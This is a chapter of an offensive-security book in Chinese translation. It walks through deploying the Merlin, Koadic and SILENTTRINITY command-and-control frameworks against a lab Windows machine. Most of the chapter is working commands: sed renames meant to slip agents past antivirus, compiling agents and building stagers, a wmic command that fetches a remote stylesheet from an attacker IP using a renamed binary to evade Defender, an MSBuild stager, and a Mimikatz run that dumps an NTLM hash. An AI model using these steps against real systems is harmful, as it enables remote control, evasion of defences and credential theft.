# 第二章：命令与控制的回归

![](img/chapterart.png)

让我们从攻击者的基本工具开始构建攻击基础设施：命令与控制（C2）服务器。我们将研究三个框架，并在我们用作目标的虚拟机上测试每个框架。首先，我们将看看过去是如何进行命令与控制的，了解我们是如何走到今天这一步的。

## 命令与控制遗产

在过去十年中，C2 框架的不败冠军——提供最广泛和最具多样化的漏洞、阶段器和反向 shell 的框架——是臭名昭著的 Metasploit 框架（[`www.metasploit.com/`](https://www.metasploit.com/)）。执行一次快速搜索，寻找渗透测试或黑客教程，我敢打赌第一个链接会指向一篇描述如何在 Linux 主机上设置 Metasploit 的自定义载荷（Meterpreter）以实现完全控制的文章。当然，文章不会提到，自 2007 年以来，这个工具的默认设置已经被每个安全产品标记为潜在威胁，但我们还是不要过于愤世嫉俗。

当需要控制一台没有麻烦的 antivirus 软件的 Linux 主机时，Metasploit 毫无疑问是我的首选。连接非常稳定，框架拥有很多模块，与许多即兴教程似乎暗示的相反，你完全可以——而且实际上 *应该*——自定义每一个用来构建阶段器和利用工具的可执行模板。Metasploit 对 Windows 的效果较差：它缺乏其他框架中 readily 可用的许多后渗透模块，而且 meterpreter 所使用的技术是每个 antivirus 软件的检查清单上首位的目标。

由于 Windows 是一个不同的“怪物”，我以前更喜欢 Empire 框架（[`github.com/EmpireProject/Empire/`](https://github.com/EmpireProject/Empire/)），它提供了一个详尽的模块、漏洞利用和横向移动技术的清单，专门针对 Active Directory 设计。遗憾的是，Empire 不再由原团队维护，原团队成员的 Twitter 账号分别是：[@harmj0y](http://www.twitter.com/@harmj0y)、[@sixdub](http://www.twitter.com/@sixdub)、[@enigma0x3](http://www.twitter.com/@enigma0x3)、[@rvrsh3ll](http://www.twitter.com/@rvrsh3ll)、[@killswitch_gui](http://www.twitter.com/@killswitch_gui) 和 [@xorrior](http://www.twitter.com/@xorrior)。他们在 Windows 黑客社区掀起了一场真正的革命，值得我们最真诚的感谢。幸运的是，令我们所有人激动的是，Empire 由 BC Security 团队重新带回了生命，他们在 2019 年 12 月发布了 3.0 版本。我理解停止维护 Empire 的决策背后的原因：这个框架的出现是基于 PowerShell 允许攻击者在 Windows 环境中畅行无阻的前提，免受像杀毒软件和监控程序这种低级防范的影响。然而，Windows 10 引入的 PowerShell 阻止日志记录和 AMSI 等新功能挑战了这一假设，因此停止该项目，转而支持像使用 C#这样的新一代攻击（例如，SharpSploit：[`github.com/cobbr/SharpSploit/`](https://github.com/cobbr/SharpSploit/)）是有道理的。

## 寻找新的 C2

由于 Empire 项目不再是一个选择，我开始寻找潜在的替代品。我担心不得不回到 Cobalt Strike，正如 99%的咨询公司那样，将钓鱼攻击伪装成红队任务。我对这款工具没有任何反感——它很棒，提供了很好的模块化，并且配得上它所取得的成功。只是看到那么多伪公司仅仅因为购买了一个$3,500 的 Cobalt Strike 许可证，就趁着红队业务的热潮大肆宣传，实在让人感到疲惫和沮丧。

然而，我感到非常惊讶的是，竟然有这么多开源 C2 框架在 Empire 留下的空白中应运而生。下面是一些引起我注意的有趣框架的简要介绍。我会快速浏览一些与我们当前场景关系不大的高级概念，并演示每个框架的有效载荷执行。如果你不完全理解某些有效载荷是如何工作的，不用担心。稍后我们会重新回到需要了解的部分。

### Merlin

Merlin（[`github.com/Ne0nd0g/merlin/`](https://github.com/Ne0nd0g/merlin/)）是一个 C2 框架，正如现在大多数流行工具一样，它是用 Golang 编写的。它可以在 Linux、Windows 以及几乎所有 Go 运行时支持的平台上运行。在目标机器上启动的代理可以是一个普通的可执行文件，比如 DLL 文件，甚至是一个 JavaScript 文件。

要开始使用 Merlin，首先需要安装 Golang 环境。这将允许你自定义可执行代理并添加后期利用模块——当然，这是非常鼓励的。

使用以下命令安装 Golang 和 Merlin：

```
root@Lab:~/# add-apt-repository ppa:longsleep/golang-backports
root@Lab:~/# apt update && sudo apt install golang-go
root@Lab:~/# go version
go version go1.13 linux/amd64

root@Lab:~/# git clone https://github.com/Ne0nd0g/merlin && cd merlin
```

Merlin 的真正创新之处在于它依赖 HTTP/2 与其后端服务器通信。与 HTTP/1.x 不同，HTTP/2 是一种二进制协议，支持许多提升性能的特性，比如流复用、服务器推送等等（有一个很好的免费资源详细讨论了 HTTP/2，地址是[`daniel.haxx.se/http2/http2-v1.12.pdf`](https://daniel.haxx.se/http2/http2-v1.12.pdf)）。即便一个安全设备捕获并解密了 C2 流量，它也可能无法解析压缩后的 HTTP/2 流量，最终只是将其原封不动地转发。

如果我们直接编译一个标准代理，它会立刻被任何常规的防病毒软件通过简单的字符串查找给识别出来，尤其是查找常见的显眼术语。因此我们需要做一些调整。我们会重命名像`ExecuteShell`这样的可疑函数，并删除原始包名`github.com/Ne0nd0g/merlin`的引用。我们将使用经典的`find`命令来查找包含这些字符串的源代码文件，并将其输出传递给`xargs`，后者会调用`sed`来替换这些可疑术语为任意单词：

```
root@Lab:~/# find . -name '*.go' -type f -print0 \
**| xargs -0 sed -i 's/ExecuteShell/MiniMice/g'**

root@Lab:~/# find . -name '*.go' -type f -print0 \
**| xargs -0 sed -i 's/executeShell/miniMice/g'**

root@Lab:~/# find . -name '*.go' -type f -print0 \
**| xargs -0 sed -i 's/\/Ne0nd0g\/merlin/\/mini\/heyho/g'**

root@Lab:~/# sed -i 's/\/Ne0nd0g\/merlin/\/mini\/heyho/g' go.mod
```

这种粗暴的字符串替换可以绕过 90%的防病毒解决方案，包括 Windows Defender。不断调整并将其与像 VirusTotal 这样的平台（[`www.virustotal.com/gui/`](https://www.virustotal.com/gui/)）进行测试，直到你通过所有测试。

现在让我们在*output*文件夹中编译一个代理，稍后我们会将其放到 Windows 测试机上：

```
root@Lab:~/# make agent-windows DIR="./output"
root@Lab:~/# ls output/
merlinAgent-Windows-x64.exe
```

一旦在机器上执行，*merlinAgent-Windows-x64.exe*应该会连接回我们的 Merlin 服务器，并允许完全控制目标。

我们通过`go run`命令启动 Merlin C2 服务器，并通过`-i 0.0.0.0`选项指示它监听所有网络接口：

```
root@Lab:~/# go run cmd/merlinserver/main.go -i 0.0.0.0 -p 8443 -psk\
`strongPassphraseWhateverYouWant`

[-] Starting h2 listener on 0.0.0.0:8443

Merlin>>

We execute the Merlin agent on a Windows virtual machine acting as the target to trigger the payload:

PS C:\> **.\merlinAgent-Windows-x64.exe -url https://192.168.1.29:8443 -psk\**
`strongPassphraseWhateverYouWant`
```

下面是你应该在攻击服务器上看到的内容：

```
[+] New authenticated agent 6c2ba6-daef-4a34-aa3d-be944f1

Merlin>> **interact 6c2ba6-daef-4a34-aa3d-be944f1**
Merlin[agent][6c2ba6-daef-...]>> ls

[+] Results for job swktfmEFWu at 2020-09-22T18:17:39Z

Directory listing for: C:\
-rw-rw-rw-  2020-09-22 19:44:21  16432  Apps
-rw-rw-rw-  2020-09-22 19:44:15  986428 Drivers
`--snip--`
```

该代理工作得非常顺利。现在我们可以在目标机器上丢弃凭证，搜索文件，移动到其他机器，启动键盘记录器，等等。

Merlin 仍然是一个处于初期阶段的项目，因此你会遇到一些 bug 和不一致的情况，主要是由于 Golang 中的 HTTP/2 库不稳定。毕竟它不是随便叫做“beta”版本的，但这个项目背后的努力绝对令人惊叹。如果你曾经想参与 Golang 的开发，或许这是一个机会。这个框架目前有接近 50 个后期利用模块，从凭证收集器到用于内存中编译和执行 C#的模块应有尽有。

### Koadic

Koadic 框架由 zerosum0x0 开发（[`github.com/zerosum0x0/koadic/`](https://github.com/zerosum0x0/koadic/)），自 DEF CON 25 发布以来，已获得广泛关注。Koadic 完全专注于 Windows 目标，但其主要卖点是它实现了各种时髦且巧妙的执行技巧：`regsvr32`（一个 Microsoft 工具，用于在 Windows 注册表中注册 DLL，以便其他程序调用；它可用于欺骗像*srcobj.dll*这样的 DLL 执行命令）、`mshta`（一个 Microsoft 工具，用于执行 HTML 应用程序或 HTA）、XSL 样式表等等。用以下命令安装 Koadic：

```
root@Lab:~/# git clone https://github.com/zerosum0x0/koadic.git
root@Lab:~/# pip3 install -r requirements.txt
```

然后使用以下命令启动它（我还包括了`help`输出的开始部分）：

```
root@Lab:~/# ./koadic

(koadic: sta/js/mshta)$ **help**
    COMMAND     DESCRIPTION
    ---------   -------------
    cmdshell    command shell to interact with a zombie
    creds       shows collected credentials
    domain      shows collected domain information
`--snip--`
```

让我们试验一个*stager*——一段小代码，会被放置在目标机器上，启动连接到服务器并加载其他有效载荷（通常存储在内存中）。一个 stager 占用的空间很小，因此如果反恶意软件工具标记了我们的代理，我们可以轻松调整代理，而不必重写我们的有效载荷。Koadic 附带的一个 stager 通过嵌入在 XML 样式表中的 ActiveX 对象传递其有效载荷，也称为*XSLT*（[`www.w3.org/Style/XSL/`](https://www.w3.org/Style/XSL/)）。它那恶意格式化的 XSLT 样式表可以输入到本地的 `wmic` 工具中，该工具将迅速执行嵌入的 JavaScript，并呈现 `os get` 命令的输出。在 Koadic 中执行以下命令以触发 stager：

```
(koadic: sta/js/mshta)$ **use stager/js/wmic**
(koadic: sta/js/wmic)$ **run**

[+] Spawned a stager at http://192.168.1.25:9996/ArQxQ.xsl

[>] wmic os get /FORMAT:"http://192.168.1.25:9996/ArQxQ.xsl"
```

然而，前面的触发命令很容易被 Windows Defender 捕获，所以我们需要稍微修改一下——例如，将*wmic.exe*重命名为一些无害的名称，如*dolly.exe*，如下面所示。根据受害者机器的 Windows 版本，你可能还需要修改 Koadic 生成的样式表以规避检测。同样，简单的字符串替换就可以做到（AV 领域的机器学习也不过如此）：

```
# Executing the payload on the target machine

C:\Temp> **copy C:\Windows\System32\wbem\wmic.exe dolly.exe**
C:\Temp> **dolly.exe os get /FORMAT:http://192.168.1.25:9996/ArQxQ.xsl**
```

Koadic 将目标机器称为“僵尸”。当我们在服务器上检查僵尸时，应该能看到目标机器的详细信息：

```
# Our server

(koadic: sta/js/mshta)$ **zombies**

[+] Zombie 1: PIANO\wk_admin* @ PIANO -- Windows 10 Pro
```

我们通过僵尸的 ID 来获取其基本系统信息：

```
(koadic: sta/js/mshta)$ **zombies 1**
   ID:                     1
   Status:                 Alive
   IP:                     192.168.1.30
   User:                   PIANO\wk_admin*
   Hostname:               PIANO
`--snip--`
```

接下来，我们可以选择任何可用的植入物，使用命令`use implant/`，从用 Mimikatz 提取密码到跳转到其他机器。如果你熟悉 Empire，那么你会觉得 Koadic 很容易上手。

唯一需要注意的是，和大多数当前的 Windows C2 框架一样，在将所有有效载荷部署到现场之前，你应该仔细定制并清理它们。开源的 C2 框架就是框架：它们处理一些枯燥的任务，比如代理通信和加密，并提供可扩展的插件和代码模板，但它们每个本地的漏洞或执行技巧都可能是被污染的，应该进行手术般的修改，以规避杀毒软件和端点检测与响应（EDR）解决方案。

对于这种清理，有时简单的字符串替换就能解决问题；有时，我们需要重新编译代码或剪切一些部分。不要期望这些框架能够在全新的、硬化的 Windows 10 系统上完美运行。花时间研究执行技术，并使其适应你自己的需求。

### SILENTTRINITY

我想介绍的最后一个 C2 框架是我个人最喜欢的：SILENTTRINITY（[`github.com/byt3bl33d3r/SILENTTRINITY`](https://github.com/byt3bl33d3r/SILENTTRINITY)）。它采取了一种非常独特的方法，我认为你应该暂时停止阅读这本书，去 YouTube 观看 Marcello Salvati 的演讲“IronPython……OMFG”，内容涉及.NET 环境。

简单地总结一下，PowerShell 和 C#代码会生成中间汇编代码，由.NET 框架执行。然而，还有许多其他语言也能完成同样的工作：F#、IronPython……以及 Boo-Lang！是的，它是一个真实的语言，查查吧。就像一个 Python 爱好者和一个微软迷被关在一个房间里，迫使他们合作，拯救人类免于即将到来的好莱坞式灾难。

虽然每个安全供应商都在忙着寻找 PowerShell 脚本和奇怪的命令行，但 SILENTTRINITY 却在云端悠闲地滑行，使用 Boo-Lang 与 Windows 内部服务交互，并投下看起来完全安全的恶意炸弹：

该工具的服务器端需要 Python 3.7，因此在安装之前，请确保 Python 正常工作；然后继续下载并启动 SILENTTRINITY 团队服务器：

```
# Terminal 1
root@Lab:~/# git clone https://github.com/byt3bl33d3r/SILENTTRINITY
root@Lab:~/# cd SILENTTRINITY
root@Lab:ST/# python3.7 -m pip install setuptools
root@Lab:ST/# `python3.7 -m pip install -r requirements.txt`

# Launch the team server
root@Lab:ST/# `python3.7 teamserver.py 0.0.0.0` `strongPasswordCantGuess` `&`
```

SILENTTRINITY 不是作为本地独立程序运行，而是启动一个监听在 5000 端口的服务器，允许多个成员连接、定义监听器、生成有效载荷等，这在团队操作中非常有用。你需要在第一个终端中保持服务器运行，然后打开第二个终端连接到团队服务器，并在 443 端口配置监听器：

```
# Terminal 2

root@Lab:~/# python3.7 st.py wss://username:`strongPasswordCantGuess`**@192.168.1.29:5000**
[1] ST >>  **listeners**
[1] ST (listeners)>> **use https**

# Configure parameters
[1] ST (listeners)(https) >> **set Name customListener**
[1] ST (listeners)(https) >> **set CallBackUrls**
**https://www.customDomain.com/news-article-feed**

# Start listener
[1] ST (listeners)(https) >> **start**
[1] ST (listeners)(https) >> list
Running:
customListener >> https://192.168.1.29:443
```

一旦连接成功，接下来的逻辑步骤是生成一个有效载荷以在目标上执行。我们选择一个包含内联 C#代码的.NET 任务，通过一个名为 MSBuild 的.NET 工具，可以在运行时编译和执行：

```
[1] ST (listeners)(https) >> **stagers**

[1] ST (stagers) >> **use msbuild**
[1] ST (stagers) >> **generate customListener**
[+] Generated stager to ./stager.xml
```

如果我们仔细查看*stager.xml*文件，可以看到它嵌入了一个名为*naga.exe*（*SILENTTRINITY/core/teamserver/data/naga.exe*）的可执行文件的 base64 编码版本，该文件连接到我们设置的监听器，然后下载一个包含 Boo-Lang DLL 和脚本的 ZIP 文件，用于启动环境。

一旦我们使用 MSBuild 在运行时编译并执行此有效载荷，就会在目标机器上运行完整的 Boo 环境，准备执行任何我们发送的恶意有效载荷：

```
# Start agent

PS C:\> **C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe stager.xml**

[*] [TS-vrFt3] Sending stage (569057 bytes) ->  192.168.1.30...
[*] [TS-vrFt3] New session 36e7f9e3-13e4-4fa1-9266-89d95612eebc connected! (192.168.1.30)
[1] ST (listeners)(https) >> **sessions**
[1] ST (sessions) >> **list**
Name           >> User         >> Address     >> Last Checkin
36e7f9e3-13... >> *wk_adm@PIANO>> 192.168.1.3 >> h 00 m 00 s 04
```

请注意，与其他两个框架不同，我们没有费心定制有效载荷以躲避 Windows Defender。它就这样工作……暂时！

我们可以交付当前的 69 个后期利用模块，涵盖从在内存中加载任意程序集（.NET 可执行文件）到常规的 Active Directory 侦察和凭证转储等功能：

```
[1] ST (sessions) >> **modules**
[1] ST (modules) >> **use boo/mimikatz**
[1] ST (modules)(boo/mimikatz) >> **run all**

[*] [TS-7fhpY] 36e7f9e3-13e4-4fa1-9266-89d95612eebc returned job result
(id: zpqY2hqD1l)
[+] Running in high integrity process
`--snip--`
    msv :
    [00000003] Primary
    * Username : wkadmin
 * Domain   : PIANO.LOCAL
    * NTLM     : adefd76971f37458b6c3b061f30e3c42
`--snip--`
```

该项目仍然非常年轻，但显示出巨大的潜力。如果你是完全的新手，可能会因为缺乏文档和明确的错误处理而遇到困难。不过，这个工具仍在积极开发中，因此这也不足为奇。我建议你先探索一些更易上手的项目，比如 Empire，然后再使用和贡献给 SILENTTRINITY。为什么不呢？这无疑是一个非常棒的项目！

近几年涌现出了许多值得关注的框架，比如 Covenant、Faction C2 等等。我强烈建议你启动几个虚拟机，进行尝试，并选择一个你最舒服的框架。

## 资源

+   在[`bit.ly/2QPJ6o9`](http://bit.ly/2QPJ6o9)和[`www.drdobbs.com/scriptlets/199101569`](https://www.drdobbs.com/scriptlets/199101569)上查找更多关于`regsvr32`微软工具的信息。

+   查看 Emeric Nasi 的博客文章“`mshta`文件的黑客技巧”了解更多关于`mshta`的信息：[`blog.sevagas.com/`](https://blog.sevagas.com/)。

+   查看 Antonio Parata 的论文“.NET 框架中的 MSIL 字节码注入”以了解更多关于.NET 框架中程序集的信息：[`bit.ly/2IL2I8g`](http://bit.ly/2IL2I8g)。
